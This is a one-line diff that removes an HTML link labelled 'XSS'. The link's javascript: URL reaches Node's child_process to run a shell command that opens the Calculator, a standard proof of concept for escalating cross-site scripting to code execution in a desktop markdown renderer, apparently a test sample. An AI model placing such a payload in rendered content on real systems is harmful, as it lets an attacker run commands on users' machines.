@@ -1,1 +1,0 @@
-<a data-from-md="" href="javascript:top.require('child_process').execSync('open -a Calculator')">XSS</a>
